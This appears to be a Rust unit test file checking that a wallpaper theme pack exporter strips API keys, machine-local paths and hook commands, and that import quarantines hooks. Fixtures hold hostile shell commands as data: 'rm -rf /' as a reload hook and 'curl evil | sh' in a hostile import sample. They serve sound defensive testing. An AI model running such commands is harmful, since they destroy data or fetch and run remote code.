#![cfg(test)]

use super::*;
use serde_json::json;

fn full_secret_config() -> Value {
    json!({
        "wallhaven": {"apiKey": "WH_SECRET"},
        "steam": {"apiKey": "STEAM_SECRET", "username": "SECRET_USER", "backend": "steamcmd"},
        "sources": {
            "unsplash": {"accessKey": "UNSPLASH_SECRET", "enabled": true}
        },
        "someToken": {"token": "TOKEN_SECRET"},
        "paths": {"wallpaper": "/home/secret/pics", "paperVkBin": "/opt/secret/skwd-wall-vk"},
        "monitor": "DP-SECRET",
        "externalMatugenCommand": "matugen /home/secret/cfg",
        "theme": {
            "backend": "native",
            "policy": "wallpaper",
            "authority": "skwd",
            "engine": "skwd-iris",
            "mode": "dark",
            "nativeColorsPath": "/home/secret/colors.json"
        },
        "integrations": [
            {"template": "src.tmpl", "output": "/home/secret/out", "reload": "rm -rf /"}
        ],
        "display": {"fillMode": "fit", "fillColor": "112233ff"},
        "paper": {"engine": "awww", "videoEngine": "vulkan", "awww": {"filter": "Nearest"}},
        "transition": {"shader": "fade", "durationMs": 800},
        "matugen": {"schemeType": "scheme-vibrant", "colorIndex": 2, "contrast": 0.5, "mode": "light"},
        "weRender": {"fps": 30},
        "effects": {"autoTheme": "Nord"},
        "components": {"wallpaperSelector": {
            "displayMode": "hex",
            "hexRadius": 120.0,
            "presets": {"hex": [{"name": "A", "params": {"hexRadius": 120.0}}]},
            "activePreset": {"hex": "A"}
        }}
    })
}

const SECRET_SENTINELS: &[&str] =
    &["WH_SECRET", "STEAM_SECRET", "SECRET_USER", "UNSPLASH_SECRET", "TOKEN_SECRET"];

#[test]
fn export_strips_secrets() {
    let overlay = build_overlay(&full_secret_config());
    let pack = Pack::new("Look", "0.1.0", overlay);
    let dir = tempfile::tempdir().unwrap();
    write_pack(dir.path(), &pack).unwrap();

    let mut blob = String::new();
    for name in ["manifest.json", "config.overlay.json"] {
        blob.push_str(&std::fs::read_to_string(dir.path().join(name)).unwrap());
    }
    for secret in SECRET_SENTINELS {
        assert!(!blob.contains(secret), "{secret} leaked");
    }
    for key in
        ["wallhaven", "steam", "sources", "someToken", "externalMatugenCommand", "integrations"]
    {
        assert!(pack.overlay.get(key).is_none(), "{key} present");
    }
}

#[test]
fn export_keeps_look_keys() {
    let overlay = build_overlay(&full_secret_config());
    assert_eq!(overlay["display"]["fillMode"], "fit");
    assert_eq!(overlay["paper"]["engine"], "awww");
    assert_eq!(overlay["paper"]["videoEngine"], "vulkan");
    assert_eq!(overlay["paper"]["awww"]["filter"], "Nearest");
    assert_eq!(overlay["transition"]["shader"], "fade");
    assert_eq!(overlay["matugen"]["schemeType"], "scheme-vibrant");
    assert_eq!(overlay["matugen"]["colorIndex"], 2);
    assert_eq!(overlay["weRender"]["fps"], 30);
    assert_eq!(overlay["effects"]["autoTheme"], "Nord");
    assert!(overlay["theme"].get("backend").is_none());
    assert_eq!(overlay["theme"]["policy"], "wallpaper");
    assert_eq!(overlay["theme"]["authority"], "skwd");
    assert_eq!(overlay["theme"]["engine"], "skwd-iris");
    assert_eq!(overlay["theme"]["mode"], "dark");
    assert!(overlay["theme"].get("nativeColorsPath").is_none());
    assert_eq!(overlay["components"]["wallpaperSelector"]["displayMode"], "hex");
    assert_eq!(overlay["components"]["wallpaperSelector"]["activePreset"]["hex"], "A");
    assert!(overlay["components"]["wallpaperSelector"]["presets"]["hex"].is_array());
}

#[test]
fn wallpaper_stored_as_key() {
    let overlay = build_overlay(&full_secret_config());
    let mut pack = Pack::new("Look", "0.1.0", overlay);
    pack.manifest.wallpaper = Some("static:city/night.png".to_string());
    let dir = tempfile::tempdir().unwrap();
    write_pack(dir.path(), &pack).unwrap();
    let text = std::fs::read_to_string(dir.path().join("manifest.json")).unwrap();
    assert!(text.contains("static:city/night.png"));
    assert!(!text.contains("/home/"));
}

#[test]
fn machine_local_absent() {
    let overlay = build_overlay(&full_secret_config());
    let flat = flatten(&overlay);
    for (path, _) in &flat {
        assert!(!path.starts_with("paths."), "{path}");
        assert_ne!(path, "monitor");
        assert_ne!(path, "externalMatugenCommand");
        assert!(!is_hook_key(path), "{path}");
        assert!(!is_machine_local_key(path), "{path}");
    }
}

#[test]
fn import_only_look_keys() {
    let overlay = build_overlay(&full_secret_config());
    let keys = import_keys(&overlay, false);
    for (path, _) in &keys {
        assert!(is_portable_key(path), "{path}");
        assert!(!is_secret_key(path));
        assert!(!is_machine_local_key(path));
    }
    assert!(keys.iter().any(|(path, _)| path == "display.fillMode"));
    assert!(keys.iter().any(|(path, _)| path == "matugen.schemeType"));
}

#[test]
fn import_quarantines_hooks() {
    let hostile = json!({
        "display": {"fillMode": "fit"},
        "integrations": [{"template": "t", "output": "/o", "reload": "curl evil | sh"}],
        "wallhaven": {"apiKey": "LEAK"},
        "paths": {"wallpaper": "/tmp/x"}
    });
    let quarantined = import_keys(&hostile, false);
    assert!(quarantined.iter().all(|(path, _)| !is_hook_key(path)));
    assert!(quarantined.iter().all(|(path, _)| !is_secret_key(path)));
    assert!(quarantined.iter().all(|(path, _)| !path.starts_with("paths.")));
    assert!(quarantined.iter().any(|(path, _)| path == "display.fillMode"));

    let allowed = import_keys(&hostile, true);
    assert!(allowed.iter().any(|(path, _)| is_hook_key(path)));
    assert!(allowed.iter().all(|(path, _)| !is_secret_key(path)));
}

#[test]
fn import_allowlist() {
    let hostile = json!({
        "display": {"fillMode": "fit"},
        "pickOnlyMode": true,
        "features": {"matugen": false},
        "restoreOnStartup": false,
        "steam": {"backend": "steamcmd"}
    });
    let keys = import_keys(&hostile, true);
    assert!(keys.iter().any(|(path, _)| path == "display.fillMode"));
    for stray in ["pickOnlyMode", "features.matugen", "restoreOnStartup", "steam.backend"] {
        assert!(keys.iter().all(|(path, _)| path != stray), "{stray} applied");
    }
}

#[test]
fn retired_theme_backend_imports() {
    let old_pack = json!({"theme": {"backend": "wallust"}});
    assert_eq!(import_keys(&old_pack, false), [("theme.backend".to_string(), json!("wallust"))]);
    assert!(build_overlay(&old_pack)["theme"].get("backend").is_none());
}

#[test]
fn pack_roundtrip() {
    let overlay = build_overlay(&full_secret_config());
    let mut pack = Pack::new("My Look", "9.9.9", overlay.clone());
    pack.manifest.wallpaper = Some("we:12345".to_string());
    pack.palette = Some(json!({"background": "#101010", "primary": "#88c0d0"}));
    pack.templates.push(Template {
        name: "waybar.css".to_string(),
        contents: "* { color: {{primary}}; }".to_string(),
    });
    pack.library_jsonl = "{\"key\":\"static:a.png\",\"fav\":true}\n".to_string();

    let dir = tempfile::tempdir().unwrap();
    write_pack(dir.path(), &pack).unwrap();
    let back = read_pack(dir.path()).unwrap();

    assert_eq!(back.manifest.name, "My Look");
    assert_eq!(back.manifest.created_by, "9.9.9");
    assert_eq!(back.manifest.wallpaper.as_deref(), Some("we:12345"));
    assert_eq!(back.overlay, overlay);
    assert_eq!(back.palette, pack.palette);
    assert_eq!(back.templates, pack.templates);
    assert_eq!(back.library_jsonl, pack.library_jsonl);
}

#[test]
fn rejects_newer_schema() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("manifest.json"),
        json!({"schema": 999, "name": "Future", "created_by": "99.0"}).to_string(),
    )
    .unwrap();
    std::fs::write(dir.path().join("config.overlay.json"), "{}").unwrap();
    let err = read_pack(dir.path()).expect_err("newer schema refused");
    assert!(err.to_string().contains("schema"));
}

#[test]
fn accepts_older_schema() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("manifest.json"),
        json!({"schema": 1, "name": "Now", "created_by": "0.1.0"}).to_string(),
    )
    .unwrap();
    std::fs::write(
        dir.path().join("config.overlay.json"),
        json!({"display":{"fillMode":"fit"}}).to_string(),
    )
    .unwrap();
    let pack = read_pack(dir.path()).expect("current schema loads");
    assert_eq!(pack.overlay["display"]["fillMode"], "fit");
    assert!(pack.palette.is_none());
    assert!(pack.templates.is_empty());
}

#[test]
fn key_classification() {
    assert!(is_portable_key("display.fillMode"));
    assert!(is_portable_key("paper.awww.filter"));
    assert!(!is_portable_key("theme.backend"));
    assert!(is_portable_key("theme.policy"));
    assert!(is_portable_key("theme.authority"));
    assert!(is_portable_key("theme.engine"));
    assert!(is_portable_key("components.wallpaperSelector.hexRadius"));
    assert!(!is_portable_key("theme.nativeColorsPath"));
    assert!(!is_portable_key("paths.wallpaper"));
    assert!(!is_portable_key("externalMatugenCommand"));

    assert!(is_secret_key("wallhaven.apiKey"));
    assert!(is_secret_key("steam.apiKey"));
    assert!(is_secret_key("steam.username"));
    assert!(is_secret_key("sources.unsplash.accessKey"));
    assert!(is_secret_key("anything.token"));
    assert!(!is_secret_key("display.fillMode"));

    assert!(is_machine_local_key("paths.paperVkBin"));
    assert!(is_machine_local_key("monitor"));
    assert!(is_machine_local_key("externalMatugenCommand"));
    assert!(is_machine_local_key("integrations"));
    assert!(is_hook_key("integrations.0.reload"));
    assert!(!is_machine_local_key("display.fillMode"));
}
